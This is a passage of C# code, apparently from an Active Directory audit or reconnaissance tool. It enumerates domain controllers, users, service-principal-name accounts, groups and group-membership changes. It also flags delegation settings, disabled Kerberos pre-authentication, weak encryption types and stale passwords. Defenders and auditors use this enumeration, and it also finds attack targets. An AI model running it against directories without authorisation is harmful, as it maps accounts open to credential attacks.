                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    System.DirectoryServices.ActiveDirectory.DomainController AdDC = (System.DirectoryServices.ActiveDirectory.DomainController) record;
                    bool? Infra = false;
                    bool? Naming = false;
                    bool? Schema = false;
                    bool? RID = false;
                    bool? PDC = false;
                    string Domain = null;
                    string Site = null;
                    string OperatingSystem = null;
                    PSObject DCSMBObj = new PSObject();

                    try
                    {
                        Domain = AdDC.Domain.ToString();
                        foreach (var OperationMasterRole in (System.DirectoryServices.ActiveDirectory.ActiveDirectoryRoleCollection) AdDC.Roles)
                        {
                            switch (OperationMasterRole.ToString())
                            {
                                case "InfrastructureRole":
                                Infra = true;
                                break;
                                case "NamingRole":
                                Naming = true;
                                break;
                                case "SchemaRole":
                                Schema = true;
                                break;
                                case "RidRole":
                                RID = true;
                                break;
                                case "PdcRole":
                                PDC = true;
                                break;
                            }
                        }
                        Site = AdDC.SiteName;
                        OperatingSystem = AdDC.OSVersion.ToString();
                    }
                    catch (System.DirectoryServices.ActiveDirectory.ActiveDirectoryServerDownException)// e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                        Infra = null;
                        Naming = null;
                        Schema = null;
                        RID = null;
                        PDC = null;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", Domain));
                    DCObj.Members.Add(new PSNoteProperty("Site", Site));
                    DCObj.Members.Add(new PSNoteProperty("Name", Convert.ToString(AdDC.Name).Split('.')[0]));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.IPAddress));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Name));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.IPAddress != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.IPAddress);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSchema = (SearchResult) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Properties["objectclass"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Properties["name"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Properties["whencreated"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Properties["whenchanged"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Properties["distinguishedname"][0]));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    bool? Enabled = null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    string SIDHistory = "";
                    bool? HasSPN = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
                        PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpired = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PREAUTH;
                    }
                    if (AdUser.Properties["msds-supportedencryptiontypes"].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties["msds-supportedencryptiontypes"][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            if ((Convert.ToString(Rule.ObjectType)).Equals("ab721a53-1e2f-11d0-9819-00aa0040529b"))
                            {
                                if (Rule.AccessControlType.ToString() == "Deny")
                                {
                                    string ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == "Everyone")
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == "NT AUTHORITY\\SELF")
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
                        else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties["pwdLastSet"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) == "0")
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
                            }
                        }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdlastset"][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxAge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if (AdUser.Properties["accountExpires"].Count != 0)
                    {
                        if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 9223372036854775807)
                        {
                            if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 0)
                            {
                                try
                                {
                                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                    AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties["accountExpires"][0]));
                                    AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                                }
                                catch //(Exception e)
                                {
                                    //    Console.WriteLine("Exception caught: {0}", e);
                                }
                            }
                        }
                    }
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        if ((bool) TrustedforDelegation)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                        {
                            DelegationType = "Constrained";
                            for (int i = 0; i < AdUser.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                            {
                                var delegateto = AdUser.Properties["msDS-AllowedToDelegateTo"][i];
                                DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                        if ((bool) TrustedtoAuthforDelegation)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }
                    if (AdUser.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdUser.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdUser.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        HasSPN = false;
                    }
                    else if (AdUser.Properties["serviceprincipalname"].Count > 0)
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", UseDESKeyOnly));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AccountLockedOut));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", (AdUser.Properties["userworkstations"].Count != 0 ? AdUser.Properties["userworkstations"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", (AdUser.Properties["admincount"].Count != 0 ? AdUser.Properties["admincount"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", (AdUser.Properties["primarygroupid"].Count != 0 ? AdUser.Properties["primarygroupid"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties["objectSID"][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Title", (AdUser.Properties["Title"].Count != 0 ? CleanString(AdUser.Properties["Title"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Department", (AdUser.Properties["Department"].Count != 0 ? CleanString(AdUser.Properties["Department"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Company", (AdUser.Properties["Company"].Count != 0 ? CleanString(AdUser.Properties["Company"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Manager", (AdUser.Properties["Manager"].Count != 0 ? CleanString(AdUser.Properties["Manager"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Info", (AdUser.Properties["info"].Count != 0 ? CleanString(AdUser.Properties["info"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", (AdUser.Properties["mobile"].Count != 0 ? CleanString(AdUser.Properties["mobile"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Email", (AdUser.Properties["mail"].Count != 0 ? CleanString(AdUser.Properties["mail"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", (AdUser.Properties["homedirectory"].Count != 0 ? AdUser.Properties["homedirectory"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", (AdUser.Properties["profilepath"].Count != 0 ? AdUser.Properties["profilepath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", (AdUser.Properties["scriptpath"].Count != 0 ? AdUser.Properties["scriptpath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdUser.Properties["useraccountcontrol"].Count != 0 ? AdUser.Properties["useraccountcontrol"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("First Name", (AdUser.Properties["givenName"].Count != 0 ? CleanString(AdUser.Properties["givenName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", (AdUser.Properties["middleName"].Count != 0 ? CleanString(AdUser.Properties["middleName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", (AdUser.Properties["sn"].Count != 0 ? CleanString(AdUser.Properties["sn"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Country", (AdUser.Properties["c"].Count != 0 ? CleanString(AdUser.Properties["c"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", (AdUser.Properties["whencreated"].Count != 0 ? AdUser.Properties["whencreated"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", (AdUser.Properties["whenchanged"].Count != 0 ? AdUser.Properties["whenchanged"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", (AdUser.Properties["distinguishedname"].Count != 0 ? CleanString(AdUser.Properties["distinguishedname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", (AdUser.Properties["canonicalname"].Count != 0 ? CleanString(AdUser.Properties["canonicalname"][0]) : "")));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties["pwdlastset"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) != "0")
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdLastSet"][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    string Description = (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "");
                    string PrimaryGroupID = (AdUser.Properties["primarygroupid"].Count != 0 ? Convert.ToString(AdUser.Properties["primarygroupid"][0]) : "");
                    if (AdUser.Properties["memberof"].Count != 0)
                    {
                        foreach (string Member in AdUser.Properties["memberof"])
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    foreach (string SPN in AdUser.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string ManagedByValue = AdGroup.Properties["managedby"].Count != 0 ? Convert.ToString(AdGroup.Properties["managedby"][0]) : "";
                    string ManagedBy = "";
                    string GroupCategory = null;
                    string GroupScope = null;
                    string SIDHistory = "";

                    if (AdGroup.Properties["managedBy"].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }

                    if (AdGroup.Properties["grouptype"].Count != 0)
                    {
                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties["grouptype"][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? "Security" : "Distribution";

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = "Universal";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = "Global";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = "DomainLocal";
                        }
                    }
                    if (AdGroup.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdGroup.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdGroup.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Properties["samaccountname"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", (AdGroup.Properties["admincount"].Count != 0 ? AdGroup.Properties["admincount"][0] : "")));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", GroupCategory));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", (AdGroup.Properties["Description"].Count != 0 ? CleanString(AdGroup.Properties["Description"][0]) : "")));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Properties["whencreated"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Properties["whenchanged"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Properties["canonicalname"][0]));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    System.DirectoryServices.ResultPropertyValueCollection ReplValueMetaData = (System.DirectoryServices.ResultPropertyValueCollection) AdGroup.Properties["msDS-ReplValueMetaData"];

                    if (ReplValueMetaData.Count != 0)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Properties["samaccountname"][0]));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
